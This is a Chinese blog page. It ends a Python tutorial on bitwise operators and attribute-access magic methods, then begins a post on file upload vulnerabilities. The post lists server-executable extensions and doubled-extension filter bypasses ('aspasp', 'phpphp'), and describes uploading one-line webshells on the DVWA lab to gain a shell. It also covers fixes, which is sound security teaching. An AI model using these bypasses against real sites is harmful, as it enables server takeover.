<h5 id="16-40-23-9-补码"><a href="#16-40-23-9-补码" class="headerlink" title="16.40.23.9 补码"></a>16.40.23.9 补码</h5><p>按位与和按位或运算的结果相信大家都不会感觉到意外，但是按位取反的运算结果，估计会让很多鱼油摸不着头脑……<br>这个其实是涉及到补码的概念：<br><img src="/image/补码.jpg" alt="补码.jpg"><br>感兴趣的童鞋可以看一下这篇扩展阅读 -&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-215498-1-1.html">为什么要使用补码（顺带讲讲二进制的前世今生及转换方法）</a><br>补码其实是在计算机底层对二进制数进行表示、运算和存储使用，对人类并不算太友好，所以这个概念在大多数 Python 教程中，都是不会涉及的，甚至压根儿都不会给你提到，所以感兴趣的童鞋，并且不怕掉头发的童鞋，可以看看，时间有限的童鞋呢，这个扩展阅读可以跳过，也无妨~</p>
<h5 id="16-40-23-10-按位异或"><a href="#16-40-23-10-按位异或" class="headerlink" title="16.40.23.10 按位异或"></a>16.40.23.10 按位异或</h5><p>按位异或，这个比较特殊，就是当两个相同的二进制位的值，不一样的时候，那么结果对应的二进制位的值为 1：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 3 ^ 2</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 3 ^ 4</span><br><span class="line">7</span><br></pre></td></tr></table></figure></p>
<h5 id="16-40-23-11-按位移动"><a href="#16-40-23-11-按位移动" class="headerlink" title="16.40.23.11 按位移动"></a>16.40.23.11 按位移动</h5><p>还有一个左移（&lt;&lt;）和右移（&gt;&gt;）运算符，运算符的左侧是运算对象，运算符的右侧是指定移动的位数：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bin(8)</span><br><span class="line">&#x27;0b1000&#x27;</span><br><span class="line">&gt;&gt;&gt; 8 &gt;&gt; 2</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 8 &gt;&gt; 3</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 8 &lt;&lt; 2</span><br><span class="line">32</span><br><span class="line">&gt;&gt;&gt; 8 &lt;&lt; 3</span><br><span class="line">64</span><br></pre></td></tr></table></figure><br>右移 n 位就是除以 2 的 n 次方：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 8 // pow(2, 2)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 8 // pow(2, 3)</span><br><span class="line">1</span><br></pre></td></tr></table></figure><br><strong>注意，一定是地板除，因为移位它是会丢失数据的，比如说十进制的数字 9，它的二进制是：</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bin(9)</span><br><span class="line">&#x27;0b1001&#x27;</span><br><span class="line">&gt;&gt;&gt; 9 &gt;&gt; 2</span><br><span class="line">2</span><br></pre></td></tr></table></figure><br>相反，左移 n 位就是乘以 2 的 n 次方：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 8 * pow(2, 2)</span><br><span class="line">32</span><br><span class="line">&gt;&gt;&gt; 8 * pow(2, 3)</span><br><span class="line">64</span><br></pre></td></tr></table></figure><br>另外，移位计数不能为负数，否则会引发 ValueError 异常：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 8 &gt;&gt; -2</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#15&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    8 &gt;&gt; -2</span><br><span class="line">ValueError: negative shift count</span><br></pre></td></tr></table></figure></p>
<h5 id="16-40-23-11-优先级"><a href="#16-40-23-11-优先级" class="headerlink" title="16.40.23.11 优先级"></a>16.40.23.11 优先级</h5><p><img src="/image/优先级.jpg" alt="优先级"><br>在同一个表达式里面，按位或、按位异或、按位与、还有移位，它们的优先级是依次递增的，然后按位非是和正、负号处于同一个优先级行列。</p>
<h5 id="16-40-23-12-math-模块相关的魔法方法"><a href="#16-40-23-12-math-模块相关的魔法方法" class="headerlink" title="16.40.23.12 math 模块相关的魔法方法"></a>16.40.23.12 math 模块相关的魔法方法</h5><p>为了方便大家日后查询，小甲鱼同样将 math 模块翻译了一份中文文档 -&gt; 传送门</p>
<p>math.trunc(x) -&gt; <code>x.__trunc__()</code></p>
<p>math.floor(x) -&gt; <code>x.__floor__()</code></p>
<p>math.ceil(x) -&gt; <code>x.__ceil__()</code></p>
<p>math 模块里面还有一个 ulp() 函数，用于表示对应浮点数的最低有效位，所以：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import math</span><br><span class="line">&gt;&gt;&gt; 0.1 + 0.2 == 0.3 + math.ulp(0.3)</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<h5 id="16-40-23-13-特别魔法方法"><a href="#16-40-23-13-特别魔法方法" class="headerlink" title="16.40.23.13 特别魔法方法"></a>16.40.23.13 特别魔法方法</h5><p>就是<code>__index__(self)</code> 方法，<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def __index__(self):</span><br><span class="line">...         print(&quot;被拦截了~&quot;)</span><br><span class="line">...         return 3</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; c = C()</span><br><span class="line">&gt;&gt;&gt; c[2]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#5&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    c[2]</span><br><span class="line">TypeError: &#x27;C&#x27; object is not subscriptable</span><br></pre></td></tr></table></figure><br>其实啊，当对象作为索引值或参数的时候，才会触发 <code>__index__()</code> 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = &quot;FishC&quot;</span><br><span class="line">&gt;&gt;&gt; s[c]</span><br><span class="line">被拦截了~</span><br><span class="line">&#x27;h&#x27;</span><br><span class="line">&gt;&gt;&gt; bin(c)</span><br><span class="line">被拦截了~</span><br><span class="line">&#x27;0b11&#x27;</span><br></pre></td></tr></table></figure><br>这个方法如果不讲，是很容易被误解为由对象的索引访问触发，其实这个方法是让对象做为索引值，被访问才触发，真的是离了个大谱就是……</p>
<h5 id="16-40-23-13-与对象的属性访问相关的-BIF"><a href="#16-40-23-13-与对象的属性访问相关的-BIF" class="headerlink" title="16.40.23.13 与对象的属性访问相关的 BIF"></a>16.40.23.13 与对象的属性访问相关的 BIF</h5><ul>
<li><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-215581-1-1.html">hasattr()</a> — 用于判断对象是否拥有某个属性。</li>
<li><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-215580-1-1.html">getarrt()</a> — 用于返回对象中指定属性的值。</li>
<li><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-215582-1-1.html">setattr()</a> — 用于设置对象中指定属性的值。</li>
<li><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-215583-1-1.html">delattr()</a> — 于删除对象中指定属性的值。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def __init__(self, name, age):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         self.__age = age</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; c = C(&quot;小甲鱼&quot;, 18)</span><br><span class="line">&gt;&gt;&gt; hasattr(c, &quot;name&quot;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; getattr(c, &quot;name&quot;)</span><br><span class="line">&#x27;小甲鱼&#x27;</span><br><span class="line">&gt;&gt;&gt; getattr(c, &quot;_C__age&quot;)</span><br><span class="line">18</span><br><span class="line">&gt;&gt;&gt; setattr(c, &quot;_C__age&quot;, 19)</span><br><span class="line">&gt;&gt;&gt; getattr(c, &quot;_C__age&quot;)</span><br><span class="line">19</span><br><span class="line">&gt;&gt;&gt; delattr(c, &quot;_C__age&quot;)</span><br><span class="line">&gt;&gt;&gt; hasattr(c, &quot;_C__age&quot;)</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<h5 id="16-40-23-14-与对象的属性访问相关的魔法方法"><a href="#16-40-23-14-与对象的属性访问相关的魔法方法" class="headerlink" title="16.40.23.14 与对象的属性访问相关的魔法方法"></a>16.40.23.14 与对象的属性访问相关的魔法方法</h5><p>与 <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-215580-1-1.html">getarrt()</a> 函数对应的是 <code>__getattribute__()</code> 这个魔法方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def __init__(self, name, age):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         self.__age = age</span><br><span class="line">...     def __getattribute__(self, attrname):</span><br><span class="line">...         print(&quot;拿来吧你~&quot;)</span><br><span class="line">...         return super().__getattribute__(attrname)</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; c = C(&quot;小甲鱼&quot;, 18)</span><br><span class="line">&gt;&gt;&gt; getattr(c, &quot;name&quot;)</span><br><span class="line">拿来吧你~</span><br><span class="line">&gt;&gt;&gt; c._C__age</span><br><span class="line">拿来吧你~</span><br><span class="line">18</span><br><span class="line">&gt;&gt;&gt; c.FishC</span><br><span class="line">拿来吧你~</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#28&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    c.y</span><br><span class="line">  File &quot;&lt;pyshell#23&gt;&quot;, line 7, in __getattribute__</span><br><span class="line">    return super().__getattribute__(name)</span><br><span class="line">AttributeError: &#x27;C&#x27; object has no attribute &#x27;FishC&#x27;</span><br></pre></td></tr></table></figure><br>大家看，尽管最后这个 “FishC” 是一个不存在的属性，但 <code>__getattribute__()</code> 方法还是会作出响应，然后抛出异常。</p>
<p>那么 <code>__getattr__()</code> 这个魔法方法是干嘛的呢？<br><strong>注意！一定要注意！！这个跟 <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-215580-1-1.html">getarrt()</a> 函数长得像的，也是跟访问属性有关系，不过它是只有在用户试图获取一个不存在的属性时才会被触发：</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def __init__(self, name, age):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         self.__age = age</span><br><span class="line">...     def __getattribute__(self, attrname):</span><br><span class="line">...         print(&quot;拿来吧你~&quot;)</span><br><span class="line">...         return super().__getattribute__(attrname)</span><br><span class="line">...     def __getattr__(self, attrname):</span><br><span class="line">...         if attrname == &quot;FishC&quot;:</span><br><span class="line">...             print(&quot;I love FishC.&quot;)</span><br><span class="line">...         else:</span><br><span class="line">...             raise AttributeError(attrname)</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; c = C(&quot;小甲鱼&quot;, 18)</span><br><span class="line">&gt;&gt;&gt; c.FishC</span><br><span class="line">拿来吧你~</span><br><span class="line">I love FishC.</span><br><span class="line">&gt;&gt;&gt; c.x</span><br><span class="line">拿来吧你~</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#39&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    c.x</span><br><span class="line">  File &quot;&lt;pyshell#35&gt;&quot;, line 12, in __getattr__</span><br><span class="line">    raise AttributeError(attrname)</span><br><span class="line">AttributeError: x</span><br></pre></td></tr></table></figure><br>属性赋值，对应的是 <code>__setattr__()</code> 魔法方法……</p>
<p>很容易，对不对？<br>大家不要掉以轻心，这里面也是有坑的，我举个例子你们就明白了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class D:</span><br><span class="line">...     def __setattr__(self, name, value):</span><br><span class="line">...         self.name = value</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; d = D()</span><br><span class="line">&gt;&gt;&gt; d.name = &quot;小甲鱼&quot;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#8&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    d.name = &quot;小甲鱼&quot;</span><br><span class="line">  File &quot;&lt;pyshell#6&gt;&quot;, line 3, in __setattr__</span><br><span class="line">    self.name = value</span><br><span class="line">  File &quot;&lt;pyshell#6&gt;&quot;, line 3, in __setattr__</span><br><span class="line">    self.name = value</span><br><span class="line">  File &quot;&lt;pyshell#6&gt;&quot;, line 3, in __setattr__</span><br><span class="line">    self.name = value</span><br><span class="line">  [Previous line repeated 1022 more times]</span><br><span class="line">RecursionError: maximum recursion depth exceeded</span><br></pre></td></tr></table></figure><br>怎么回事？</p>
<p>怎么报错了？</p>
<p>大家仔细思考一下，self 是什么？</p>
<p>是对象自身，对吧？</p>
<p>那么捕获到赋值操作的时候，我们执行 self.name = value，那不就是相当于又给自己调用一次赋值操作，那么又会触发 <strong>setattr</strong>() 的这个魔法方法，然后又再次执行 self.name = value 的赋值操作……</p>
<p>这样就导致无限递归了！</p>
<p>遇到这个情况有两种解决方案：</p>
<ol>
<li><p>交给 super()</p>
</li>
<li><p>通过字典来存放对象属性</p>
</li>
</ol>
<p>对象的属性和值本来就是存放在一个叫 <code>`__dict__</code> 的字典中：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class D:</span><br><span class="line">...     def __setattr__(self, name, value):</span><br><span class="line">...         self.__dict__[name] = value</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; d = D()</span><br><span class="line">&gt;&gt;&gt; d.name = &quot;小甲鱼&quot;</span><br><span class="line">&gt;&gt;&gt; d.name</span><br><span class="line">&#x27;小甲鱼&#x27;</span><br></pre></td></tr></table></figure><br>这样我们就绕开了死亡螺旋~</p>
<p>同样的道理，使用 <code>__delattr__()</code> 魔法方法的时候，也要注意这个死亡螺旋，我们还是得利用这个字典来实现属性的删除：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class D:</span><br><span class="line">...     def __setattr__(self, name, value):</span><br><span class="line">...         self.__dict__[name] = value</span><br><span class="line">...     def __delattr__(self, name):</span><br><span class="line">...         del self.__dict__[name]</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; d = D()</span><br><span class="line">&gt;&gt;&gt; d.name = &quot;小甲鱼&quot;</span><br><span class="line">&gt;&gt;&gt; d.__dict__</span><br><span class="line">&#123;&#x27;name&#x27;: &#x27;小甲鱼&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; del d.name</span><br><span class="line">&gt;&gt;&gt; d.__dict__</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">文件上传漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2022-03-08 19:59:41" itemprop="dateCreated datePublished" datetime="2022-03-08T19:59:41+08:00">2022-03-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-28 09:49:31" itemprop="dateModified" datetime="2024-04-28T09:49:31+08:00">2024-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
                </span>
                  ، 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/web%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">web漏洞</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="1-描述"><a href="#1-描述" class="headerlink" title="1.描述"></a>1.描述</h2><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本文件。如常见的头像上传，图片上传，oa 办公文件上传，媒体上传，允许用户上传文件，如果过滤不严格，恶意用户利用文件上传漏洞，上传有害的可以执行脚本文件到服务器中，可以获取服务器的权限，或进一步危害服务器。</p>
<h3 id="1-1-危害"><a href="#1-1-危害" class="headerlink" title="1.1 危害"></a>1.1 危害</h3><p>非法用户可以上传的恶意文件控制整个网站，甚至是控制服务器，这个恶意脚本文件，又被称为 webshell，上传 webshell 后门 很方便地查看服务器信息，查看目录，执行系统命令等。</p>
<h2 id="2-有关文件上传的知识"><a href="#2-有关文件上传的知识" class="headerlink" title="2. 有关文件上传的知识"></a>2. 有关文件上传的知识</h2><h3 id="2-1-文件上传的过程"><a href="#2-1-文件上传的过程" class="headerlink" title="2.1 文件上传的过程"></a>2.1 <strong>文件上传的过程</strong></h3><p>客户端 选择发送的文件-&gt;服务器接收-&gt;网站程序判断-&gt;临时文件-&gt;移动到指定的路径<br>服务器 接收的资源程</p>
<p><em>服务器接收资源代码</em><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">    echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">    echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">    echo &quot;Stored in: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p><em>客户端文件上传的代码</em><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;&lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">   &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-2-文件上传代码"><a href="#2-2-文件上传代码" class="headerlink" title="2.2 文件上传代码"></a>2.2 <strong>文件上传代码</strong></h3><p>文件上传时会返回一些代码 返回客户端 客户端根据这些值判断上传是否正常</p>
<ul>
<li>值：0; 没有错误发生，文件上传成功。</li>
<li>值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制。</li>
<li>值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。</li>
<li>值：3; 文件只有部分被上传。</li>
<li>4; 没有文件被上传。</li>
</ul>
<h3 id="2-3-文件上传漏洞"><a href="#2-3-文件上传漏洞" class="headerlink" title="2.3 文件上传漏洞"></a>2.3 <strong>文件上传漏洞</strong></h3><p>文件上传漏洞分为 直接文件上传，这种漏洞类型是属于高危漏洞的一种，能直接 getshell，而且没有任何限制，攻击者很容易通过上传点，获取网站的控制权限，另外一种是有条件的上传漏洞，这种漏洞一般是开发者经验不足，对文件上传做了简单的限制，如简单的前端认证，文件头文件检测，这种检测行为，可以完全绕过的，另外一个方面就是权限认证没处理，没有对文件上传页面进行权限认证，匿名者就能访问上传文件，上传网页后门到网站目录，控制整个网站，还有一些上传逻辑有问题，导致文件上传可以被绕过，上传后门到网站上。有的文件上传漏洞则是通过中间件或者系统特性上传可以被服务器解析脚本文件，从而导致网站可被控制。</p>
<h3 id="2-4-文件上传漏洞的修复方案"><a href="#2-4-文件上传漏洞的修复方案" class="headerlink" title="2.4 文件上传漏洞的修复方案"></a>2.4 <strong>文件上传漏洞的修复方案</strong></h3><ul>
<li>在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问。</li>
<li>文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击者放弃这个攻击途径。</li>
<li>设置上传白名单，白名单只允许图片上传如，<code>.jpg</code> <code>.png</code> <code>.gif</code> 其他文件均不允许上传</li>
<li>上传的后缀名，一定要设置成图片格式如 <code>.jpg</code> <code>.png</code> <code>.gif</code></li>
</ul>
<h2 id="3-文件上传的攻击方法"><a href="#3-文件上传的攻击方法" class="headerlink" title="3. 文件上传的攻击方法"></a>3. 文件上传的攻击方法</h2><p>寻找测试网站的文件上传的模块，常见 头像上传，修改上传，文件编辑器中文件上传，图片上传、媒体上传等，通过抓包上传恶意的文件进行测试，上传后缀名 asp php aspx 等的动态语言脚本，查看上传时的返回信息，判断是否能直接上传，如果不能直接上传，再进行测试上传突破，例如上传文件的时候只允许图片格式的后缀，但是修改文件时，却没有限制后缀名，图片文件可以修改成动态语言格式如 php，则可能访问这个文件的 URL 直接 getshell，可以控制网站。</p>
<h2 id="4-常见的网站文件后缀名"><a href="#4-常见的网站文件后缀名" class="headerlink" title="4. 常见的网站文件后缀名"></a>4. 常见的网站文件后缀名</h2><p>可执行脚本的文件后缀名，可被网站目录解析。以下是常见的后缀名<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">asp</span><br><span class="line"></span><br><span class="line">asa</span><br><span class="line"></span><br><span class="line">cdx</span><br><span class="line"></span><br><span class="line">cer</span><br><span class="line"></span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">aspx</span><br><span class="line"></span><br><span class="line">ashx</span><br><span class="line"></span><br><span class="line">jsp</span><br><span class="line"></span><br><span class="line">php3</span><br><span class="line"></span><br><span class="line">php.a</span><br><span class="line"></span><br><span class="line">shtml</span><br><span class="line"></span><br><span class="line">phtml</span><br></pre></td></tr></table></figure><br>有些网站会对 asp 或者 php 进行过滤转成空可用这些后缀名。<br>aspasp  asaspp<br>phpphp</p>
<h2 id="5-任意文件上传漏洞"><a href="#5-任意文件上传漏洞" class="headerlink" title="5. 任意文件上传漏洞"></a>5. 任意文件上传漏洞</h2><p>任意文件上传漏洞又名文件直接上传漏洞 这种漏洞危害极大，如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限，甚至进一步权限提升，控制服务器。</p>
<h3 id="5-1-任意文件上传演示"><a href="#5-1-任意文件上传演示" class="headerlink" title="5.1 任意文件上传演示"></a>5.1 任意文件上传演示</h3><p>选择写好的一句话脚本上传,网页会返回路径 访问 url 即可 getshell<br><img src="/image/DVWA.png" alt="DVWA"></p>
<p>上传的文件可以改成其他恶意脚本或者后门，如蚁剑，中国菜刀一句话，后门大马。即可获得 webshell。<br><img src="/image/phpinfo.png" alt="phpinfo"></p>
